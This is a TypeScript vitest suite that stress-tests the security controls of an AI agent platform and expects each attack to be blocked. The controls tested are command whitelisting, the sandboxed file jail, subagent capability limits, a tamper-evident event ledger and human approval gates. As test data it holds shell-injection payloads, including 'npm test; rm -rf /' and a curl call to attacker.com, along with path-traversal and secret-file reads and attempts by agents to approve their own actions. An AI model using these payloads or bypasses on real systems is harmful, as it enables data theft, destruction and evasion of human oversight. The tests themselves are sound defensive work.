import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import * as crypto from 'node:crypto';
import { KinDatabase } from '../src/storage/db.js';
import { MigrationRunner } from '../src/storage/migration_runner.js';
import { Sentinel } from '../src/security/sentinel.js';
import { PolicyEngine } from '../src/policy/policy_engine.js';
import { ToolEngine } from '../src/execution/tool_engine.js';
import { ToolGateway } from '../src/execution/tool_gateway.js';
import { EventLedger } from '../src/security/event_ledger.js';
import { SecretVault } from '../src/security/secret_vault.js';
import { CoreServer } from '../src/server/core_server.js';
import { WorkspaceRepository } from '../src/domain/workspace_repository.js';
import { AgentRepository } from '../src/domain/agent_repository.js';

describe('Milestone 1 Adversarial Security Challenger: Empirical Stress Harness', () => {
  let tempDir: string;
  let tempDbPath: string;
  let db: KinDatabase;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'kin-m1-challenger-'));
    tempDbPath = path.join(tempDir, 'challenger.sqlite');
    db = new KinDatabase(tempDbPath);
    new MigrationRunner(db).runMigrations();
    seedFoundationalEntities(db, tempDir);
  });

  afterEach(() => {
    try {
      db.close();
    } catch {}
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {}
  });

  function seedFoundationalEntities(database: KinDatabase, rootPath: string = tempDir) {
    const now = Date.now();
    database.execute(
      `INSERT OR IGNORE INTO workspaces (id, name, root_path, default_autonomy_mode, created_at, updated_at)
       VALUES ('ws-challenger', 'Challenger Workspace', ?, 'AUTO', ?, ?);`,
      rootPath,
      now,
      now
    );
    database.execute(
      `INSERT OR IGNORE INTO projects (id, workspace_id, name, repo_path, created_at, updated_at)
       VALUES ('proj-challenger', 'ws-challenger', 'Challenger Project', ?, ?, ?);`,
      rootPath,
      now,
      now
    );
    database.execute(
      `INSERT OR IGNORE INTO agent_definitions (id, name, role, system_prompt, default_model_id, created_at)
       VALUES ('def-sub', 'Subagent', 'Worker', 'You are worker', 'mock-model', ?);`,
      now
    );
    database.execute(
      `INSERT OR IGNORE INTO agent_identities (id, workspace_id, project_id, definition_id, display_name, active_model_id, is_orchestrator, created_at, updated_at)
       VALUES ('agent-sub', 'ws-challenger', 'proj-challenger', 'def-sub', 'SubWorker', 'mock-model', 0, ?, ?);`,
      now,
      now
    );
    database.execute(
      `INSERT OR IGNORE INTO agent_runs (id, agent_id, project_id, state, heartbeat_at, created_at)
       VALUES ('run-sub', 'agent-sub', 'proj-challenger', 'running', ?, ?);`,
      now,
      now
    );
  }

  // ==========================================================================
  // Vector 1: Shell Subshell Execution Bypasses in PolicyEngine
  // ==========================================================================
  describe('Vector 1: Shell Subshell & Command Chaining Bypasses in PolicyEngine', () => {
    const policyEngine = new PolicyEngine();

    const attackPayloads = [
      'npm test $(whoami)',
      'npm test `id`',
      'npm test <(cat /etc/passwd)',
      'npm test > out.txt',
      'npm test >> out.txt',
      'npm test < in.txt',
      'npm test; rm -rf /',
      'npm test && id',
      'npm test || id',
      'npm test | grep root',
      'npm test \n id',
      'npm test \r id',
      'npm test $SECRET_VAR',
      'npm test ${SECRET_VAR}',
      'npm test $(curl http://attacker.com/leak)',
      'npm test && cat .env',
      'npm test || cat vault.key',
      'npm test ; cat kin_storage.sqlite',
      'npm test > /dev/null',
    ];

    it.each(attackPayloads)('rejects subshell/chaining payload from whitelist: %s', (payload) => {
      const result = policyEngine.evaluateAction({
        agentId: 'agent-sub',
        parentRunId: 'parent-run-root',
        toolName: 'executeShell',
        commandOrPath: payload,
        riskLevel: 'HIGH',
        autonomyMode: 'AUTO',
        agentCapabilities: ['shell:exec'],
        parentCapabilities: ['shell:exec'],
        subagentApprovedWhitelist: {
          permittedCommands: ['npm test'],
        },
      });

      // The malicious subshell/chaining payload MUST NOT be auto-approved via whitelist!
      // In AUTO mode with risk HIGH, it must require interactive human approval.
      expect(result.requiresInteractiveApproval).toBe(true);
      expect(result.reason).not.toContain('Action pre-authorized by parent');
    });

    it('rejects prefix boundary tricks (e.g. npm testing, npm test-all)', () => {
      const boundaryAttacks = ['npm testing', 'npm test-something', 'npm test_something', 'npm test/sub'];

      for (const cmd of boundaryAttacks) {
        const result = policyEngine.evaluateAction({
          agentId: 'agent-sub',
          parentRunId: 'parent-run-root',
          toolName: 'executeShell',
          commandOrPath: cmd,
          riskLevel: 'HIGH',
          autonomyMode: 'AUTO',
          agentCapabilities: ['shell:exec'],
          parentCapabilities: ['shell:exec'],
          subagentApprovedWhitelist: {
            permittedCommands: ['npm test'],
          },
        });

        expect(result.requiresInteractiveApproval).toBe(true);
        expect(result.reason).not.toContain('Action pre-authorized by parent');
      }
    });

    it('allows clean whitelisted command and safe sub-arguments', () => {
      const legitimateCommands = ['npm test', 'npm test -- --grep "unit"', 'npm test file.js'];

      for (const cmd of legitimateCommands) {
        const result = policyEngine.evaluateAction({
          agentId: 'agent-sub',
          parentRunId: 'parent-run-root',
          toolName: 'executeShell',
          commandOrPath: cmd,
          riskLevel: 'HIGH',
          autonomyMode: 'AUTO',
          agentCapabilities: ['shell:exec'],
          parentCapabilities: ['shell:exec'],
          subagentApprovedWhitelist: {
            permittedCommands: ['npm test'],
          },
        });

        expect(result.allowed).toBe(true);
        expect(result.requiresInteractiveApproval).toBe(false);
        expect(result.reason).toContain('Action pre-authorized by parent');
      }
    });
  });

  // ==========================================================================
  // Vector 2: Directory Traversal and Sensitive Pattern Read in ToolEngine jailedFs
  // ==========================================================================
  describe('Vector 2: Directory Traversal and Sensitive File Defense in ToolEngine jailedFs', () => {
    it('blocks reading .env, vault.key, sqlite files, and credentials from worker jailedFs', async () => {
      const toolEngine = new ToolEngine(db);

      // Create sensitive test files inside worktree
      fs.writeFileSync(path.join(tempDir, '.env'), 'SECRET_API_KEY=12345');
      fs.writeFileSync(path.join(tempDir, '.env.production'), 'SECRET_PROD=99999');
      fs.writeFileSync(path.join(tempDir, 'vault.key'), '00112233445566778899aabbccddeeff');
      fs.writeFileSync(path.join(tempDir, 'ipc_auth.token'), 'ipc_secret_token_data');
      fs.writeFileSync(path.join(tempDir, 'kin_storage.sqlite'), 'sqlite_raw_data');
      fs.writeFileSync(path.join(tempDir, 'kin_storage.sqlite-wal'), 'wal_data');
      fs.writeFileSync(path.join(tempDir, 'id_rsa'), 'PRIVATE_KEY');

      const createRes = toolEngine.createTool({
        name: 'read_sensitive_probe',
        description: 'Attempts to read sensitive files via jailedFs',
        handlerCode: `
          module.exports = async function(params, context) {
            return { content: fs.readFileSync(params.target, 'utf-8') };
          };
        `,
        requireApproval: false,
        projectId: 'proj-challenger',
      });
      expect(createRes.success).toBe(true);

      const sensitiveTargets = [
        '.env',
        './.env',
        '.env.production',
        'vault.key',
        './vault.key',
        'ipc_auth.token',
        'kin_storage.sqlite',
        'kin_storage.sqlite-wal',
        'id_rsa',
      ];

      for (const target of sensitiveTargets) {
        const execRes = await toolEngine.executeTool(
          'read_sensitive_probe',
          { target },
          { projectId: 'proj-challenger', worktreeRoot: tempDir }
        );

        expect(execRes.success).toBe(false);
        expect(execRes.error).toMatch(/Path jail access to sensitive file blocked/i);
      }
    });

    it('blocks directory traversal outside worktree root via jailedFs', async () => {
      const toolEngine = new ToolEngine(db);

      // Create a secret file outside the worktree root
      const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'kin-outside-'));
      const outsideSecret = path.join(outsideDir, 'secret_outside.txt');
      fs.writeFileSync(outsideSecret, 'HOST_OUTSIDE_SECRET');

      try {
        const createRes = toolEngine.createTool({
          name: 'read_traversal_probe',
          description: 'Attempts to traverse outside root',
          handlerCode: `
            module.exports = async function(params, context) {
              return { content: fs.readFileSync(params.target, 'utf-8') };
            };
          `,
          requireApproval: false,
          projectId: 'proj-challenger',
        });
        expect(createRes.success).toBe(true);

        const traversalTargets = [
          '../../secret_outside.txt',
          'foo/../../../secret_outside.txt',
          outsideSecret, // Absolute path outside worktree
        ];

        for (const target of traversalTargets) {
          const execRes = await toolEngine.executeTool(
            'read_traversal_probe',
            { target },
            { projectId: 'proj-challenger', worktreeRoot: tempDir }
          );

          expect(execRes.success).toBe(false);
          expect(execRes.error).toMatch(/Path jail traversal blocked/i);
        }
      } finally {
        try {
          fs.rmSync(outsideDir, { recursive: true, force: true });
        } catch {}
      }
    });

    it('blocks writing sensitive files or writing outside worktree root via jailedFs', async () => {
      const toolEngine = new ToolEngine(db);

      const createRes = toolEngine.createTool({
        name: 'write_probe',
        description: 'Attempts writing to sensitive or outside target',
        handlerCode: `
          module.exports = async function(params, context) {
            fs.writeFileSync(params.target, params.content);
            return { written: true };
          };
        `,
        requireApproval: false,
        projectId: 'proj-challenger',
      });
      expect(createRes.success).toBe(true);

      const forbiddenWrites = [
        { target: '.env', content: 'ATTACKER=1', pattern: /sensitive file blocked/i },
        { target: 'vault.key', content: 'BADKEY', pattern: /sensitive file blocked/i },
        { target: '../../escape.txt', content: 'ESCAPE', pattern: /Path jail traversal blocked/i },
      ];

      for (const item of forbiddenWrites) {
        const execRes = await toolEngine.executeTool(
          'write_probe',
          { target: item.target, content: item.content },
          { projectId: 'proj-challenger', worktreeRoot: tempDir }
        );

        expect(execRes.success).toBe(false);
        expect(execRes.error).toMatch(item.pattern);
      }
    });
  });

  // ==========================================================================
  // Vector 3: Capability Elevation Bypass in Sentinel Without Parent Grants
  // ==========================================================================
  describe('Vector 3: Capability Elevation Bypass in Sentinel', () => {
    const sentinel = Sentinel.getInstance();

    it('requires interactive approval when subagent requests capabilities not in parent baseline', () => {
      const decision = sentinel.evaluate({
        agentId: 'agent-sub',
        parentRunId: 'parent-run-root',
        parentCapabilities: ['fs:read'], // Parent only has read
        toolName: 'executeShell',
        params: { command: 'echo hello' },
        riskLevel: 'LOW',
        autonomyMode: 'FULL_ACCESS',
        agentCapabilities: ['shell:exec', 'fs:read'], // Subagent attempts elevation to shell:exec
      });

      // Monotonic capability attenuation violated: subagent cannot autonomously execute shell:exec
      expect(decision.requiresApproval).toBe(true);
      expect(decision.reason).toContain('Monotonic capability attenuation violated');
    });

    it('requires interactive approval when parentCapabilities is empty array', () => {
      const decision = sentinel.evaluate({
        agentId: 'agent-sub',
        parentRunId: 'parent-run-root',
        parentCapabilities: [], // Parent has zero capabilities
        toolName: 'readFile',
        params: { filePath: 'README.md' },
        riskLevel: 'LOW',
        autonomyMode: 'FULL_ACCESS',
        agentCapabilities: ['fs:read'],
      });

      expect(decision.requiresApproval).toBe(true);
      expect(decision.reason).toContain('Monotonic capability attenuation violated');
    });

    it('fails closed when agent has zero capabilities (agentCapabilities: [])', () => {
      const decision = sentinel.evaluate({
        agentId: 'agent-unauthorized',
        toolName: 'readFile',
        params: { filePath: 'README.md' },
        riskLevel: 'LOW',
        autonomyMode: 'FULL_ACCESS',
        agentCapabilities: [], // Zero capabilities
      });

      expect(decision.allowed).toBe(false);
      expect(decision.requiresApproval).toBe(false);
      expect(decision.reason).toContain('SECURITY DENIAL: Fail-closed capability check');
    });

    it('enforces CRITICAL risk and interactive approval on vault.key even in FULL_ACCESS autonomy mode', () => {
      const decision = sentinel.evaluate({
        agentId: 'agent-admin',
        toolName: 'readFile',
        params: { filePath: '.kin/vault.key' },
        riskLevel: 'LOW', // Caller tries to declare LOW risk
        autonomyMode: 'FULL_ACCESS', // FULL_ACCESS normally auto-approves
        agentCapabilities: ['*'], // Has wildcard capability
      });

      // Sentinel authoritative risk escalation elevates vault.key to CRITICAL
      // Under FULL_ACCESS, CRITICAL actions MANDATE interactive approval
      expect(decision.requiresApproval).toBe(true);
      expect(decision.reason).toContain('CRITICAL operation');
    });

    it('enforces CRITICAL risk on kin_storage.sqlite and ipc_auth.token in FULL_ACCESS mode', () => {
      const targets = ['kin_storage.sqlite', 'kin_storage.sqlite-wal', 'ipc_auth.token'];

      for (const t of targets) {
        const decision = sentinel.evaluate({
          agentId: 'agent-admin',
          toolName: 'readFile',
          params: { filePath: t },
          riskLevel: 'LOW',
          autonomyMode: 'FULL_ACCESS',
          agentCapabilities: ['*'],
        });

        expect(decision.requiresApproval).toBe(true);
        expect(decision.reason).toContain('CRITICAL operation');
      }
    });

    it('EMPIRICAL INVESTIGATION: detects missing parentCapabilities forwarding in ToolGateway.executeTool', async () => {
      const agentRepo = new AgentRepository(db);
      const toolGateway = new ToolGateway({ db, agentRepo });

      // Context with parentCapabilities: ['fs:read'] and allowedCapabilities: ['shell:exec']
      const context = {
        runId: 'run-sub',
        agentId: 'agent-sub',
        parentRunId: 'run-parent',
        parentCapabilities: ['fs:read'], // Parent only has fs:read
        allowedCapabilities: ['shell:exec', 'fs:read'],
        autonomyMode: 'FULL_ACCESS' as const,
        worktreeRoot: tempDir,
      };

      const result = await toolGateway.executeTool(
        'executeShell',
        { command: 'echo hello' },
        context
      );

      // Observation: ToolGateway.executeTool did NOT pass parentCapabilities to Sentinel!
      // In ToolGateway.executeTool (tool_gateway.ts:1441-1451):
      // const sentinelResult = sentinel.evaluate({
      //   agentId: context.agentId,
      //   runId: context.runId,
      //   parentRunId: context.parentRunId,
      //   toolName,
      //   params,
      //   riskLevel: risk,
      //   autonomyMode: context.autonomyMode,
      //   agentCapabilities: effectiveCapabilities,
      //   authorizationToken: context.approvalToken,
      // });
      // Notice: parentCapabilities was NOT forwarded!
      // Therefore, under FULL_ACCESS, the subagent was NOT challenged with monotonic capability attenuation!
      console.log('ToolGateway elevation empirical result:', {
        executed: result.success,
        requiresApproval: result.requiresApproval,
      });

      // Assert that ToolGateway enforces capability attenuation because parentCapabilities was forwarded:
      expect(result.success).toBe(false);
      expect(result.requiresApproval).toBe(true);
    });
  });

  // ==========================================================================
  // Vector 4: EventLedger Hash Tampering and Forged HMAC-SHA256 Records
  // ==========================================================================
  describe('Vector 4: EventLedger Hash Tampering & Cryptographic Downgrade Attack', () => {
    let vaultDir: string;
    let vault: SecretVault;

    beforeEach(() => {
      vaultDir = fs.mkdtempSync(path.join(os.tmpdir(), 'kin-vault-challenger-'));
      process.env.KIN_CONFIG_DIR = vaultDir;
      // Initialize vault with master key
      vault = SecretVault.getInstance();
    });

    afterEach(() => {
      try {
        fs.rmSync(vaultDir, { recursive: true, force: true });
      } catch {}
    });

    it('detects direct payload tampering in event_journal', () => {
      const ledger = EventLedger.ensureInitialized(db);

      const id1 = ledger.record({
        eventType: 'USER_REQUEST',
        entityType: 'agent',
        entityId: 'agent-sub',
        runId: 'run-sub',
        payload: { prompt: 'Initial user query' },
      });

      const id2 = ledger.record({
        eventType: 'TOOL_STARTED',
        entityType: 'tool',
        entityId: 'executeShell',
        runId: 'run-sub',
        payload: { command: 'npm test' },
      });

      // Chain integrity must initially be valid
      const initialCheck = ledger.verifyChainIntegrity();
      expect(initialCheck.valid).toBe(true);
      expect(initialCheck.verifiedCount).toBe(2);

      // ATTACK: Direct payload tampering without updating hash
      db.execute(
        `UPDATE event_journal SET payload_json = ? WHERE id = ?`,
        JSON.stringify({ command: 'rm -rf / --no-preserve-root' }),
        id2
      );

      const tamperedCheck = ledger.verifyChainIntegrity();
      expect(tamperedCheck.valid).toBe(false);
      expect(tamperedCheck.compromisedId).toBe(id2);
      expect(tamperedCheck.error).toContain('Tampered event record detected');
    });

    it('detects broken chain link (prev_hash tampering)', () => {
      const ledger = EventLedger.ensureInitialized(db);

      ledger.record({
        eventType: 'USER_REQUEST',
        entityType: 'agent',
        entityId: 'agent-sub',
        runId: 'run-sub',
        payload: { prompt: 'Initial user query' },
      });

      const id2 = ledger.record({
        eventType: 'TOOL_STARTED',
        entityType: 'tool',
        entityId: 'executeShell',
        runId: 'run-sub',
        payload: { command: 'npm test' },
      });

      // ATTACK: Break the link to prev_hash
      db.execute(`UPDATE event_journal SET prev_hash = 'BROKEN_HASH_LINK' WHERE id = ?`, id2);

      const check = ledger.verifyChainIntegrity();
      expect(check.valid).toBe(false);
      expect(check.compromisedId).toBe(id2);
      expect(check.error).toContain('Broken chain link at event ID');
    });

    it('EMPIRICAL INVESTIGATION: Cryptographic downgrade attack via unkeyed SHA-256 fallback', () => {
      const ledger = EventLedger.ensureInitialized(db);

      // Verify that vault has master key and computeEventHash creates HMAC
      const masterKey = vault.getMasterKey();
      expect(masterKey).toBeDefined();
      expect(masterKey.length).toBeGreaterThan(0);

      const id1 = ledger.record({
        eventType: 'USER_REQUEST',
        entityType: 'agent',
        entityId: 'agent-sub',
        runId: 'run-sub',
        payload: { prompt: 'Legitimate user request' },
      });

      // Query recorded event
      const row = db.queryOne<{
        id: number;
        event_type: string;
        entity_type: string;
        entity_id: string;
        run_id: string | null;
        payload_json: string;
        record_hash: string;
        prev_hash: string;
        created_at: number;
      }>('SELECT * FROM event_journal WHERE id = ?', id1)!;

      // Verify legitimate record is HMAC-SHA256
      const hmacExpected = crypto.createHmac('sha256', masterKey)
        .update(`${row.prev_hash}:${row.event_type}:${row.entity_type}:${row.entity_id}:${row.run_id || ''}:${row.payload_json}:${row.created_at}`)
        .digest('hex');
      expect(row.record_hash).toBe(hmacExpected);

      // ATTACK: An attacker without master key tampers with payload and calculates unkeyed SHA-256
      const tamperedPayload = JSON.stringify({ prompt: 'TAMPERED FORGED ACTION' });
      const rawData = `${row.prev_hash}:${row.event_type}:${row.entity_type}:${row.entity_id}:${row.run_id || ''}:${tamperedPayload}:${row.created_at}`;
      const unkeyedSha256 = crypto.createHash('sha256').update(rawData).digest('hex');

      // Attacker writes tampered payload and unkeyed sha256 into database
      db.execute(
        `UPDATE event_journal SET payload_json = ?, record_hash = ? WHERE id = ?`,
        tamperedPayload,
        unkeyedSha256,
        id1
      );

      // Verify if verifyChainIntegrity detects or accepts the downgrade
      const audit = ledger.verifyChainIntegrity();
      console.log('Cryptographic downgrade attack audit outcome:', audit);

      // Empirical verification: Unkeyed SHA-256 fallback is rejected when vault master key is active:
      expect(audit.valid).toBe(false);
      expect(audit.compromisedId).toBe(id1);
    });
  });

  // ==========================================================================
  // Vector 5: CAS Approval Resolution Concurrency & Race Conditions
  // ==========================================================================
  describe('Vector 5: CAS Approval Resolution Concurrency & Race Conditions', () => {
    let server: CoreServer;
    let port: number;

    beforeEach(async () => {
      server = new CoreServer({ port: 0, dbPath: tempDbPath, requireIpcAuth: false });
      port = await server.start();
    });

    afterEach(async () => {
      if (server) {
        await server.stop();
      }
    });

    it('guarantees atomic CAS update under 30 concurrent resolution requests (exactly 1 wins, all others fail-closed)', async () => {
      const now = Date.now();
      const approvalId = `appr-race-${crypto.randomUUID().slice(0, 8)}`;

      // Insert pending approval directly in database
      db.execute(
        `INSERT INTO approvals (id, run_id, agent_id, tool_name, action_payload_json, risk_level, status, expires_at, created_at)
         VALUES (?, 'run-sub', 'agent-sub', 'executeShell', '{"command":"echo race"}', 'HIGH', 'pending', ?, ?)`,
        approvalId,
        now + 60000,
        now
      );

      // Verify initial pending state
      const initialRow = db.queryOne<{ status: string }>('SELECT status FROM approvals WHERE id = ?', approvalId);
      expect(initialRow?.status).toBe('pending');

      // Launch 30 concurrent POST requests to resolve approval simultaneously
      const concurrency = 30;
      const requestPromises = Array.from({ length: concurrency }, (_, idx) =>
        fetch(`http://127.0.0.1:${port}/api/approvals/${approvalId}/resolve`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ approved: true, workerIdx: idx }),
        }).then(async (res) => ({
          status: res.status,
          body: await res.json().catch(() => ({})),
        }))
      );

      const results = await Promise.all(requestPromises);

      const successResults = results.filter((r) => r.status === 200);
      const rejectedResults = results.filter((r) => r.status === 409 || r.status === 400);

      console.log(`Race condition outcome across ${concurrency} parallel requests:`, {
        success200: successResults.length,
        rejected: rejectedResults.length,
        statuses: results.map(r => r.status),
      });

      // Strict CAS concurrency invariants:
      // 1. EXACTLY 1 request must succeed with HTTP 200
      expect(successResults.length).toBe(1);

      // 2. ALL remaining requests (29) must be rejected (HTTP 409 Conflict or HTTP 400 Already resolved)
      expect(rejectedResults.length).toBe(concurrency - 1);

      // 3. Database status must be 'approved'
      const finalRow = db.queryOne<{ status: string; decided_at: number }>(
        'SELECT status, decided_at FROM approvals WHERE id = ?',
        approvalId
      );
      expect(finalRow?.status).toBe('approved');
      expect(finalRow?.decided_at).toBeGreaterThan(0);
    });

    it('blocks self-resolution by agent identities (x-caller-agent-id header) with HTTP 403', async () => {
      const now = Date.now();
      const approvalId = `appr-self-${crypto.randomUUID().slice(0, 8)}`;

      db.execute(
        `INSERT INTO approvals (id, run_id, agent_id, tool_name, action_payload_json, risk_level, status, expires_at, created_at)
         VALUES (?, 'run-sub', 'agent-sub', 'executeShell', '{"command":"echo self"}', 'HIGH', 'pending', ?, ?)`,
        approvalId,
        now + 60000,
        now
      );

      const res = await fetch(`http://127.0.0.1:${port}/api/approvals/${approvalId}/resolve`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-caller-agent-id': 'agent-sub', // Agent attempts to resolve its own approval!
        },
        body: JSON.stringify({ approved: true }),
      });

      expect(res.status).toBe(403);
      const data: any = await res.json();
      expect(data.error).toContain('Agents cannot self-resolve approval gates');

      // Approval remains pending
      const row = db.queryOne<{ status: string }>('SELECT status FROM approvals WHERE id = ?', approvalId);
      expect(row?.status).toBe('pending');
    });

    it('rejects expired approvals with status marked as expired', async () => {
      const now = Date.now();
      const approvalId = `appr-exp-${crypto.randomUUID().slice(0, 8)}`;

      db.execute(
        `INSERT INTO approvals (id, run_id, agent_id, tool_name, action_payload_json, risk_level, status, expires_at, created_at)
         VALUES (?, 'run-sub', 'agent-sub', 'executeShell', '{"command":"echo exp"}', 'HIGH', 'pending', ?, ?)`,
        approvalId,
        now - 5000, // Expired 5 seconds ago
        now - 10000
      );

      const res = await fetch(`http://127.0.0.1:${port}/api/approvals/${approvalId}/resolve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ approved: true }),
      });

      expect(res.status).toBe(400);
      const data: any = await res.json();
      expect(data.error).toContain('has expired');

      const row = db.queryOne<{ status: string }>('SELECT status FROM approvals WHERE id = ?', approvalId);
      expect(row?.status).toBe('expired');
    });
  });
});
